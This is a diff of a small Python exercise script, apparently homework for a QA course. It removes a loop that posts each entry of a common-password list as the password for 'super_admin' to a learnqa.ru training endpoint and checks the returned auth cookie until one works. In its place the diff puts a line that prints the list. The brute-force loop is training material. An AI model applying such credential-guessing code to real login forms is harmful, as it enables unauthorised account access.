@@ -1,6 +1,6 @@
-import requests
+import string
 
-passwords = """
+data = """
 password	password	123456	123456	123456	123456	123456	123456	123456
 123456	123456	password	password	password	password	password	password	123456789
 12345678	12345678	12345678	12345	12345678	12345	12345678	123456789	qwerty
@@ -27,26 +27,5 @@ qazwsx	ninja	azerty	123123	solo	loveme	whatever	donald	dragon
 michael	mustang	trustno1	batman	passw0rd	zaq1zaq1	qazwsx	password1	password1
 Football	password1	000000	trustno1	starwars	password1	trustno1	qwerty123	123qwe
 """
-pass_list = set(passwords.split())
 
-for p in pass_list:
-    response = requests.post(
-        "https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
-        data={
-            "login": "super_admin",
-            "password": p
-        }
-    )
-
-    auth_cookie = dict(response.cookies)
-
-    response = requests.post(
-        "https://playground.learnqa.ru/ajax/api/check_auth_cookie",
-        cookies=auth_cookie
-    )
-
-    if response.text == "You are authorized":
-        print(f"Поздравляем, пароль {p} верный!")
-        break
-
-    print(f"Пароль {p} не подходит, пробуем следующий. . .")
+print(data.split())
